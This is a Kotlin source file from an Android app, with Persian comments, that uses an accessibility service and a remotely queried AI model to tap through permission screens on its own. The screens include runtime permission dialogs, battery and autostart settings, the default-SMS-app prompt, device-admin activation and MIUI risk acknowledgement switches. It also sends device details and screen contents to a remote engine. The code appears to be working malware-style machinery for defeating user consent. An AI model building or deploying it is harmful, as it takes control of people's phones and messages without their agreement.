package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.content.Context
import com.base.realtime.RealtimeApp
import com.base.realtime.device.ClientInfo
import com.base.realtime.engine.RealtimeEngine
import com.base.realtime.protocol.Protocol
import com.base.realtime.service.RealtimeService
import java.security.MessageDigest
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.longOrNull
import kotlinx.serialization.json.put

/**
 * AI UI guide: وقتی [AutoGrantDebug.useAi] روشن است مسیر اصلی شناسایی/کلیک نودهاست.
 * بدون useAi فقط بعد از miss تپر قطعی صدا زده می‌شود.
 */
internal object UiGuideBridge {

    private const val TAG = "AutoGrant"
    /** اولین لود Ollama روی CPU اغلب >10s؛ بعد از warm معمولاً زیر ۱s. */
    private const val REQUEST_TIMEOUT_AI_MS = 35_000L
    private const val LATE_REPLY_GRACE_MS = 20_000L
    /** نود کمتر = prompt کوتاه‌تر = Ollama سریع‌تر (۷b). */
    private const val MAX_NODES = 14
    private const val MAX_NODES_OEM = 24

    private val main = Handler(Looper.getMainLooper())
    private val inFlight = AtomicBoolean(false)
    private var pendingRequestId: String? = null
    private var pendingCacheKey: String? = null
    private var pendingActions: List<GuideAction> = emptyList()
    private var engine: RealtimeEngine? = null
    private var lastRequestAt = 0L
    /** بعد از timeout هنوز این id را برای جواب دیر قبول می‌کنیم. */
    private var lateAcceptRequestId: String? = null
    private var lateAcceptUntil = 0L
    private var pendingSentAt = 0L
    private var pendingPhase: String = ""
    /** generation برای باطل کردن جواب‌های فاز قبلی. */
    private var generation = 0
    private var pendingGeneration = 0
    /** آخرین snapshot OEM — برای حلقهٔ اسکرول اجباری. */
    @Volatile
    var lastNearAppCount: Int = 0
        private set

    /** Panel/job phase outside AutoGrant (e.g. SMS_DEFAULT restore). */
    @Volatile
    private var guidedJobPhase: String = ""

    @Volatile
    private var guidedTargetPkg: String = ""

    @Volatile
    private var guidedTargetLabel: String = ""

    data class GuideAction(
        val op: String,
        val nodeId: String = "",
        val target: String = "",
        val direction: String = "",
    )

    fun bindEngine(engine: RealtimeEngine?) {
        this.engine = engine
    }

    fun isBusy(): Boolean = inFlight.get()

    fun hasGuidedJob(): Boolean = guidedJobPhase.isNotBlank()

    fun beginGuidedJob(phase: String, targetPkg: String, targetLabel: String) {
        guidedJobPhase = phase.trim()
        guidedTargetPkg = targetPkg.trim()
        guidedTargetLabel = targetLabel.trim()
        abortStale("begin guided $phase")
        AutoGrantTiming.i(
            "ai.guided begin phase=$guidedJobPhase pkg=$guidedTargetPkg label=$guidedTargetLabel",
        )
    }

    fun endGuidedJob() {
        if (guidedJobPhase.isBlank()) return
        AutoGrantTiming.i("ai.guided end phase=$guidedJobPhase")
        abortStale("end guided")
        guidedJobPhase = ""
        guidedTargetPkg = ""
        guidedTargetLabel = ""
    }

    /** وقتی فاز عوض شد جواب درپرواز را دور بینداز تا روی UI جدید tap نزند. */
    fun abortStale(reason: String) {
        if (!inFlight.get() && pendingRequestId == null && lateAcceptRequestId == null) return
        generation++
        val oldPhase = pendingPhase
        pendingRequestId = null
        lateAcceptRequestId = null
        lateAcceptUntil = 0L
        pendingActions = emptyList()
        pendingCacheKey = null
        pendingPhase = ""
        inFlight.set(false)
        PermissionDialogTapper.resetAiForceSchedule()
        AutoGrantTiming.i("ai.abort reason=$reason wasPhase=$oldPhase gen=$generation")
    }

    /** Resolve engine even before RealtimeService has called ensureStarted. */
    private fun resolveEngine(context: Context): RealtimeEngine? {
        engine?.let { return it }
        return try {
            val eng = RealtimeApp.engine(context)
            bindEngine(eng)
            RealtimeService.start(context)
            eng.ensureStarted()
            eng
        } catch (t: Throwable) {
            Log.w(TAG, "resolveEngine", t)
            null
        }
    }

    fun onGuideMessage(payload: JsonObject?) {
        if (payload == null) return
        val requestId = payload["requestId"]?.jsonPrimitive?.contentOrNull.orEmpty()
        if (requestId.isBlank()) return
        val matchesPending = requestId == pendingRequestId
        val matchesLate = requestId == lateAcceptRequestId &&
            SystemClock.uptimeMillis() <= lateAcceptUntil
        if (!matchesPending && !matchesLate) {
            Log.i(TAG, "ai.ui.guide ignore unmatched requestId=$requestId")
            return
        }
        // جواب فاز قبلی بعد از abort — اجرا نکن
        if (pendingGeneration != generation && !matchesPending) {
            Log.i(TAG, "ai.ui.guide ignore stale gen requestId=$requestId")
            return
        }
        if (matchesLate && !matchesPending) {
            Log.i(TAG, "ai.ui.guide late reply accepted requestId=$requestId")
            pendingRequestId = requestId
            inFlight.set(true)
        }
        lateAcceptRequestId = null
        val livePhase = phaseFromMode()
        if (pendingPhase.isNotBlank() && livePhase.isNotBlank() && pendingPhase != livePhase) {
            AutoGrantTiming.w(
                "ai.ui.guide drop reply — phase mismatch pending=$pendingPhase live=$livePhase",
            )
            pendingRequestId = null
            inFlight.set(false)
            PermissionDialogTapper.resetAiForceSchedule()
            return
        }
        val cacheKey = payload["cacheKey"]?.jsonPrimitive?.contentOrNull.orEmpty()
        val source = payload["source"]?.jsonPrimitive?.contentOrNull.orEmpty()
        val err = payload["error"]?.jsonPrimitive?.contentOrNull.orEmpty()
        val cacheMs = payload["cacheMs"]?.jsonPrimitive?.longOrNull ?: 0L
        val ollamaMs = payload["ollamaMs"]?.jsonPrimitive?.longOrNull ?: 0L
        val totalMs = payload["totalMs"]?.jsonPrimitive?.longOrNull ?: 0L
        val rttMs = if (pendingSentAt > 0L) SystemClock.elapsedRealtime() - pendingSentAt else -1L
        val rawActions = parseActions(payload["actions"])
        val actions = sanitizeActions(rawActions, pendingPhase)
        pendingCacheKey = cacheKey
        pendingActions = actions
        AutoGrantTiming.i(
            "ai.reply phase=$pendingPhase source=$source raw=${rawActions.size} " +
                "actions=${actions.map { a ->
                    when {
                        a.op == "tap_text" && a.target.isNotBlank() -> "tap_text:${a.target.take(24)}"
                        a.nodeId.isNotBlank() -> "${a.op}:${a.nodeId}"
                        else -> a.op
                    }
                }} " +
                "rttMs=$rttMs serverTotalMs=$totalMs cacheMs=$cacheMs ollamaMs=$ollamaMs" +
                if (err.isNotBlank()) " error=$err" else "",
        )
        val gen = pendingGeneration
        main.post { executePending(gen) }
    }

    fun requestIfNeeded(service: AccessibilityService, phase: String, where: String): Boolean {
        if (modeNotEligible()) return false
        if (!inFlight.compareAndSet(false, true)) return false
        val now = SystemClock.uptimeMillis()
        val minGap = if (AutoGrantDebug.useAi) 200L else 2_500L
        if (now - lastRequestAt < minGap) {
            inFlight.set(false)
            return false
        }
        lastRequestAt = now
        val snapshot = buildSnapshot(service) ?: run {
            inFlight.set(false)
            return false
        }
        val requestId = UUID.randomUUID().toString()
        pendingRequestId = requestId
        pendingPhase = phase
        pendingGeneration = generation
        pendingSentAt = SystemClock.elapsedRealtime()
        lateAcceptRequestId = null
        pendingCacheKey = null
        pendingActions = emptyList()
        val info = ClientInfo.collect(service)
        val labels = when {
            guidedTargetLabel.isNotBlank() -> listOf(guidedTargetLabel)
            else -> snapshot.appLabels
        }
        val displayName = guidedTargetLabel.ifBlank { snapshot.appDisplayName }
        val targetPkg = guidedTargetPkg.ifBlank { snapshot.targetPkg }
        val payload = buildJsonObject {
            put("requestId", requestId)
            put("phase", phase)
            put("tapMode", if (guidedJobPhase.isNotBlank()) "GUIDED" else PermissionDialogTapper.mode.name)
            put("targetPkg", targetPkg)
            put("family", PhoneFamily.current().name)
            put("brand", info.brand)
            put("manufacturer", info.manufacturer)
            put("model", info.model)
            put("sdk", info.sdk)
            put("androidRelease", info.androidRelease)
            put("oemSkin", info.oemSkin)
            put("screenHash", snapshot.screenHash)
            put("nodes", snapshot.nodesJson)
            put("missWhere", where)
            if (labels.isNotEmpty()) {
                put(
                    "appLabels",
                    buildJsonArray {
                        for (label in labels) add(JsonPrimitive(label))
                    },
                )
            }
            if (snapshot.listHint.isNotBlank()) {
                put("listHint", snapshot.listHint)
            }
            if (displayName.isNotBlank()) {
                put("appDisplayName", displayName)
            }
            if (snapshot.visibleLabels.isNotEmpty()) {
                put(
                    "visibleLabels",
                    buildJsonArray {
                        for (label in snapshot.visibleLabels) add(JsonPrimitive(label))
                    },
                )
            }
            if (snapshot.uiStep.isNotBlank()) {
                put("uiStep", snapshot.uiStep)
            }
        }
        val eng = resolveEngine(service)
        if (eng == null) {
            AutoGrantTiming.w("ai.request skipped — no engine phase=$phase")
            inFlight.set(false)
            return false
        }
        val ok = eng.enqueue(Protocol.TYPE_AI_UI_GUIDE_REQUEST, payload)
        if (!ok) {
            AutoGrantTiming.w("ai.request enqueue failed phase=$phase")
            inFlight.set(false)
            return false
        }
        lastNearAppCount = snapshot.nearAppCount
        AutoGrantTiming.i(
            "=====> REQUEST ai.ui.guide phase=$phase where=$where nodes=${snapshot.nodeCount} " +
                "pkg=${snapshot.targetPkg} nearApp=${snapshot.nearAppCount} " +
                "labels=${snapshot.visibleLabels.size} listHint=${snapshot.listHint.ifBlank { "-" }} " +
                "timeoutMs=$REQUEST_TIMEOUT_AI_MS",
        )
        val reqGen = pendingGeneration
        main.postDelayed({
            if (reqGen != generation) return@postDelayed
            if (pendingRequestId == requestId && inFlight.get()) {
                Log.w(TAG, "ai.ui.guide timeout after ${REQUEST_TIMEOUT_AI_MS}ms — still accepting late reply")
                lateAcceptRequestId = requestId
                lateAcceptUntil = SystemClock.uptimeMillis() + LATE_REPLY_GRACE_MS
                finishResult(ok = false, error = "timeout", gen = reqGen)
            }
        }, REQUEST_TIMEOUT_AI_MS)
        return true
    }

    private fun modeNotEligible(): Boolean {
        if (guidedJobPhase.isNotBlank()) return false
        return when (PermissionDialogTapper.mode) {
            TapMode.RUNTIME_DIALOG,
            TapMode.SETTINGS_ALLOW,
            TapMode.SETTINGS_SWITCH,
            TapMode.OEM_APP_LIST,
            -> false
            else -> true
        }
    }

    private fun phaseFromMode(): String {
        if (guidedJobPhase.isNotBlank()) return guidedJobPhase
        return when (PermissionDialogTapper.mode) {
            TapMode.RUNTIME_DIALOG -> "RUNTIME"
            TapMode.SETTINGS_ALLOW -> "BATTERY"
            TapMode.SETTINGS_SWITCH -> "EXACT_ALARM"
            TapMode.OEM_APP_LIST -> "OEM_AUTOSTART"
            else -> ""
        }
    }

    private fun executePending(gen: Int) {
        if (gen != generation) {
            AutoGrantTiming.i("ai.exec skip — aborted gen=$gen current=$generation")
            return
        }
        val service = AgentAccessibilityService.get()
        val requestId = pendingRequestId
        if (service == null || requestId == null) {
            finishResult(ok = false, error = "no service", gen = gen)
            return
        }
        val live = phaseFromMode()
        if (pendingPhase.isNotBlank() && live.isNotBlank() && pendingPhase != live) {
            AutoGrantTiming.w("ai.exec skip — phase mismatch pending=$pendingPhase live=$live")
            pendingRequestId = null
            inFlight.set(false)
            PermissionDialogTapper.resetAiForceSchedule()
            return
        }
        val actions = pendingActions
        if (actions.isEmpty() || (actions.size == 1 && actions[0].op == "give_up")) {
            finishResult(ok = false, error = "give_up", gen = gen)
            return
        }
        runActionsSequentially(service, actions, 0, false, gen)
    }

    /**
     * Drop give_up/done; never back after tap on battery/runtime (closes UI too early).
     * Keep multiple taps — first nodeId is often wrong (cached n1 ≠ Allow).
     */
    private fun sanitizeActions(raw: List<GuideAction>, phase: String): List<GuideAction> {
        if (raw.isEmpty()) return raw
        if (raw.all { it.op == "give_up" }) return listOf(GuideAction("give_up"))
        val out = ArrayList<GuideAction>(raw.size)
        var sawTap = false
        var taps = 0
        for (a in raw) {
            when (a.op) {
                "give_up", "done" -> continue
                "back" -> {
                    if (sawTap) continue
                    // back UI را زود می‌بندد؛ برای همهٔ فازهای auto-grant ممنوع
                    if (phase == "BATTERY" || phase == "RUNTIME" || phase == "EXACT_ALARM" ||
                        phase == "OEM_AUTOSTART" || phase == "SMS_DEFAULT" || phase == "DEVICE_ADMIN"
                    ) {
                        continue
                    }
                    out += a
                }
                "tap", "tap_text", "app_toggle", "toggle", "scroll_to_find", "click" -> {
                    sawTap = true
                    taps++
                    out += a
                    if (taps >= 3) return out
                }
                "scroll", "scroll_forward", "scroll_backward" -> out += a
                "done" -> {
                    out += a
                    return out
                }
                else -> out += a
            }
        }
        return if (out.isEmpty()) listOf(GuideAction("give_up")) else out
    }

    private fun runActionsSequentially(
        service: AccessibilityService,
        actions: List<GuideAction>,
        index: Int,
        anyOk: Boolean,
        gen: Int,
    ) {
        if (gen != generation) {
            AutoGrantTiming.i("ai.exec aborted mid-run gen=$gen current=$generation")
            return
        }
        if (index >= actions.size) {
            finishResult(ok = anyOk, error = if (anyOk) "" else "exec failed", gen = gen)
            return
        }
        val action = actions[index]
        val opStart = SystemClock.elapsedRealtime()
        val result = GuideActionExecutor.execute(
            service = service,
            op = action.op,
            nodeId = action.nodeId,
            target = action.target,
            direction = action.direction,
            phase = pendingPhase,
        )
        val ok = anyOk || result.ok
        AutoGrantTiming.i(
            "ai.exec[$index] op=${action.op} target=${action.target.take(32)} nodeId=${action.nodeId} " +
                "ok=${result.ok} detail=${result.detail} opMs=${SystemClock.elapsedRealtime() - opStart}",
        )
        if (action.op == "done" && result.ok) {
            finishResult(ok = true, error = "", gen = gen)
            return
        }
        val last = index + 1 >= actions.size
        val gap = when {
            last -> 20L
            action.op == "scroll" || action.op == "scroll_forward" ||
                action.op == "scroll_backward" || action.op == "scroll_to_find" -> 450L
            action.op == "tap" || action.op == "toggle" || action.op == "click" ->
                when (pendingPhase) {
                    "OEM_AUTOSTART" -> 300L
                    "SMS_DEFAULT" -> 550L
                    else -> 80L
                }
            else -> 40L
        }
        main.postDelayed({ runActionsSequentially(service, actions, index + 1, ok, gen) }, gap)
    }

    private fun finishResult(ok: Boolean, error: String, gen: Int = generation) {
        if (gen != generation) {
            AutoGrantTiming.i("ai.finish skip — aborted gen=$gen current=$generation")
            return
        }
        val requestId = pendingRequestId.orEmpty()
        val cacheKey = pendingCacheKey.orEmpty()
        val actions = pendingActions
        val phaseDone = pendingPhase
        pendingRequestId = null
        inFlight.set(false)
        PermissionDialogTapper.resetAiForceSchedule()
        if (requestId.isBlank()) return
        if (ok) {
            PermissionDialogTapper.noteAiGuideSucceeded()
        }
        val ctx = AgentAccessibilityService.get()
        if (ctx != null) {
            val eng = resolveEngine(ctx)
            if (eng != null) {
                val payload = buildJsonObject {
                    put("requestId", requestId)
                    if (cacheKey.isNotBlank()) put("cacheKey", cacheKey)
                    put("ok", ok)
                    if (error.isNotBlank()) put("error", error)
                    if (actions.isNotEmpty()) {
                        put(
                            "actions",
                            buildJsonArray {
                                for (a in actions) {
                                    add(
                                        buildJsonObject {
                                            put("op", a.op)
                                            if (a.nodeId.isNotBlank()) put("nodeId", a.nodeId)
                                            if (a.target.isNotBlank()) put("target", a.target)
                                            if (a.direction.isNotBlank()) put("direction", a.direction)
                                        },
                                    )
                                }
                            },
                        )
                    }
                }
                eng.enqueue(Protocol.TYPE_AI_UI_GUIDE_RESULT, payload)
            }
        }
        if (ok) {
            AutoGrantTiming.i("SUCCESS ai.ui.guide executed phase=$phaseDone requestId=$requestId")
        } else {
            AutoGrantTiming.w("FAIL ai.ui.guide phase=$phaseDone requestId=$requestId error=$error")
        }
        if (phaseDone == "SMS_DEFAULT" || phaseDone == "DEVICE_ADMIN") return
        // فاز عوض شده — orchestrator را با نتیجهٔ کهنه صدا نزن
        val live = phaseFromMode()
        if (phaseDone.isNotBlank() && live.isNotBlank() && phaseDone != live) {
            AutoGrantTiming.w("ai.finish drop callback — phase mismatch done=$phaseDone live=$live")
            return
        }
        main.post {
            AutoGrantOrchestrator.onAiGuideFinished(phaseDone, ok)
        }
    }

    private fun parseActions(el: kotlinx.serialization.json.JsonElement?): List<GuideAction> {
        val arr = el as? JsonArray ?: return emptyList()
        val out = ArrayList<GuideAction>(arr.size)
        for (item in arr) {
            val obj = item as? JsonObject ?: continue
            val op = obj["op"]?.jsonPrimitive?.contentOrNull?.lowercase().orEmpty()
            if (op.isBlank()) continue
            out += GuideAction(
                op = op,
                nodeId = obj["nodeId"]?.jsonPrimitive?.contentOrNull.orEmpty(),
                target = obj["target"]?.jsonPrimitive?.contentOrNull.orEmpty(),
                direction = obj["direction"]?.jsonPrimitive?.contentOrNull.orEmpty(),
            )
        }
        return out
    }

    private data class Snapshot(
        val targetPkg: String,
        val screenHash: String,
        val nodesJson: JsonArray,
        val nodeCount: Int,
        val nearAppCount: Int,
        val appLabels: List<String>,
        val listHint: String,
        val visibleLabels: List<String>,
        val appDisplayName: String,
        val uiStep: String,
    )

    private fun buildSnapshot(service: AccessibilityService): Snapshot? {
        val root = PermissionDialogTapper.resolveGuideRoot(service) ?: return null
        val pkg = root.packageName?.toString().orEmpty()
        PermissionDialogTapper.clearGuideNodes()
        val smsDefault = guidedJobPhase == "SMS_DEFAULT"
        val deviceAdmin = guidedJobPhase == "DEVICE_ADMIN"
        val oemList = PermissionDialogTapper.mode == TapMode.OEM_APP_LIST
        val appLabels = when {
            guidedTargetLabel.isNotBlank() -> listOf(guidedTargetLabel)
            else -> PermissionDialogTapper.appLabelsForGuide(service)
        }
        val appDisplayName = when {
            guidedTargetLabel.isNotBlank() -> guidedTargetLabel
            else -> appLabels.firstOrNull { it.length >= 2 && !it.contains('.') }.orEmpty()
        }
        val nearBounds = if (oemList) PermissionDialogTapper.nearAppBoundsForGuide(service) else emptySet()
        data class Cand(
            val node: AccessibilityNodeInfo,
            val text: String,
            val desc: String,
            val cls: String,
            val bounds: String,
            val interactive: Boolean,
            val nearApp: Boolean,
        )
        val cands = ArrayList<Cand>(64)
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty() && cands.size < 80) {
            val node = queue.removeFirst()
            val text = node.text?.toString().orEmpty().trim()
            val desc = node.contentDescription?.toString().orEmpty().trim()
            val interactive = node.isClickable || node.isCheckable
            val useful = interactive || text.isNotBlank() || desc.isNotBlank()
            if (useful) {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                val bounds = "${rect.left},${rect.top},${rect.right},${rect.bottom}"
                val cls = node.className?.toString()?.substringAfterLast('.').orEmpty()
                val nearByBounds = bounds in nearBounds
                // SMS: exact app title only — dialog headline also contains the name as a prefix.
                val nearByLabel = when {
                    smsDefault -> appLabels.any { label ->
                        label.length >= 2 &&
                            (text.equals(label, ignoreCase = true) || desc.equals(label, ignoreCase = true))
                    }
                    oemList -> appLabels.any { label ->
                        isAppRowTitle(text, label) || isAppRowTitle(desc, label)
                    }
                    else -> false
                }
                cands += Cand(node, text, desc, cls, bounds, interactive, nearByBounds || nearByLabel)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        // Prefer labeled buttons (مجاز/Allow) over empty clickable layouts.
        // OEM: nearApp Switch بالاتر از عنوان TextView.
        cands.sortByDescending { c ->
            val cls = c.cls
            val isToggle = c.node.isCheckable ||
                cls.contains("Switch", ignoreCase = true) ||
                cls.contains("CheckBox", ignoreCase = true) ||
                cls.contains("Toggle", ignoreCase = true)
            val exactName = smsDefault && appLabels.any { label ->
                c.text.equals(label, ignoreCase = true)
            }
            val confirmish = smsDefault && looksSmsConfirm(c.text)
            val adminAck = deviceAdmin && isToggle && !c.node.isChecked
            val adminConfirm = deviceAdmin && looksAdminConfirm(c.text)
            when {
                exactName && c.interactive -> 10
                exactName -> 9
                adminAck -> 9
                confirmish -> 8
                adminConfirm -> 8
                (oemList || smsDefault) && c.nearApp && isToggle && !c.node.isChecked -> 7
                (oemList || smsDefault) && c.nearApp && isToggle -> 6
                (oemList || smsDefault) && c.nearApp && c.interactive -> 5
                oemList && isToggle && c.interactive -> 4
                oemList && isToggle -> 3
                c.interactive && c.text.isNotBlank() -> 2
                c.interactive -> 1
                else -> 0
            }
        }
        val visibleSet = LinkedHashSet<String>()
        for (c in cands) {
            if (c.text.length >= 2) visibleSet.add(c.text.take(48))
            if (c.desc.length >= 2) visibleSet.add(c.desc.take(40))
        }
        val visibleLabels = visibleSet.take(64).toList()
        // همیشه نود بفرست تا CLICK(target_id) کار کند (قبلاً useAi → nodes خالی بود)
        val limit = if (oemList || smsDefault || deviceAdmin) MAX_NODES_OEM else MAX_NODES
        val selected = if (smsDefault) {
            cands.filter { it.text.isNotBlank() || it.nearApp || it.interactive && it.desc.isNotBlank() }
                .take(limit)
                .ifEmpty { cands.take(limit) }
        } else {
            cands.take(limit)
        }
        val hashParts = StringBuilder()
        hashParts.append(pkg).append('|')
        var nearAppCount = 0
        val nodesJson = buildJsonArray {
            selected.forEachIndexed { idx, cand ->
                val id = "n$idx"
                val isToggle = cand.node.isCheckable ||
                    cand.cls.contains("Switch", ignoreCase = true) ||
                    cand.cls.contains("CheckBox", ignoreCase = true)
                // MIUI Switch often has empty text; borrow sibling risk label for the AI line.
                val labelText = when {
                    cand.text.isNotBlank() -> cand.text
                    deviceAdmin && isToggle -> nearbyGuideLabel(cand.node)
                    else -> ""
                }
                hashParts.append(labelText).append('#').append(cand.desc).append('#').append(cand.cls)
                if (cand.nearApp) hashParts.append("#near")
                hashParts.append(';')
                PermissionDialogTapper.rememberGuideNode(id, cand.bounds, labelText.ifBlank { cand.text }, cand.desc)
                if (cand.nearApp) nearAppCount++
                add(
                    buildJsonObject {
                        put("id", id)
                        if (labelText.isNotBlank()) put("text", labelText.take(48))
                        if (cand.desc.isNotBlank()) put("desc", cand.desc.take(40))
                        if (cand.cls.isNotBlank()) put("cls", cand.cls)
                        if (cand.node.isClickable) put("clickable", true)
                        if (cand.node.isCheckable) put("checkable", true)
                        if (cand.node.isChecked) put("checked", true)
                        if (cand.nearApp) put("nearApp", true)
                    },
                )
            }
        }
        val appVisible = appLabels.any { label ->
            label.length >= 2 && visibleLabels.any { v -> isAppRowTitle(v, label) }
        }
        val listHint = when {
            (oemList || smsDefault) && !appVisible -> "scroll_needed"
            (oemList || smsDefault) && appVisible -> "app_visible"
            else -> ""
        }
        val uiStep = when {
            oemList && appVisible -> "list_toggle"
            oemList -> "list_find_app"
            smsDefault && appVisible -> "pick_sms_app"
            smsDefault -> "find_sms_app"
            else -> ""
        }
        if (selected.isEmpty() && visibleLabels.isEmpty()) return null
        return Snapshot(
            targetPkg = pkg,
            screenHash = sha1Hex(hashParts.toString()).take(24),
            nodesJson = nodesJson,
            nodeCount = selected.size,
            nearAppCount = nearAppCount,
            appLabels = appLabels,
            listHint = listHint,
            visibleLabels = visibleLabels,
            appDisplayName = appDisplayName,
            uiStep = uiStep,
        )
    }

    private fun sha1Hex(s: String): String {
        val dig = MessageDigest.getInstance("SHA-1").digest(s.toByteArray(Charsets.UTF_8))
        return dig.joinToString("") { b -> "%02x".format(b) }
    }

    /** عنوان ردیف اپ، نه جمله‌ای که فقط اسم اپ را ذکر می‌کند. */
    private fun isAppRowTitle(text: String, label: String): Boolean {
        val t = text.trim()
        val l = label.trim()
        if (l.length < 2 || t.length < 2) return false
        if (t.equals(l, ignoreCase = true)) return true
        if (t.length > l.length + 6) return false
        return t.startsWith(l, ignoreCase = true)
    }

    private fun looksSmsConfirm(text: String): Boolean {
        val t = text.trim().lowercase()
        if (t.isBlank() || t.length > 40) return false
        if (t == "لغو" || t == "cancel" || t == "نه" || t == "خیر") return false
        return t.contains("تنظیم برای پیش") || t.contains("set as default") ||
            t.contains("تنظیم به‌عنوان پیش") ||
            ((t.contains("پیش‌فرض") || t.contains("پیش فرض")) && t.contains("تنظیم"))
    }

    private fun looksAdminConfirm(text: String): Boolean {
        val t = text.trim().lowercase()
        if (t.isEmpty()) return false
        if (Regex("""\(\s*\d+\s*\)""").containsMatchIn(t)) return false
        return t.contains("فعال‌سازی") || t.contains("فعال سازی") || t.contains("فعال کردن") ||
            t.contains("activate") || t == "تأیید" || t == "تایید" || t == "ok" ||
            (t.contains("enable") && !t.contains("disable"))
    }

    /** Sibling/parent labels next to an empty Switch/CheckBox (MIUI risk ack). */
    private fun nearbyGuideLabel(node: AccessibilityNodeInfo): String {
        val parent = try {
            node.parent
        } catch (_: Throwable) {
            null
        } ?: return ""
        val parts = ArrayList<String>()
        for (i in 0 until parent.childCount.coerceAtMost(8)) {
            try {
                val c = parent.getChild(i) ?: continue
                val t = (c.text?.toString().orEmpty() + " " +
                    c.contentDescription?.toString().orEmpty()).trim()
                if (t.length >= 2) parts += t.take(48)
            } catch (_: Throwable) {
            }
        }
        return parts.joinToString(" ").take(48)
    }
}
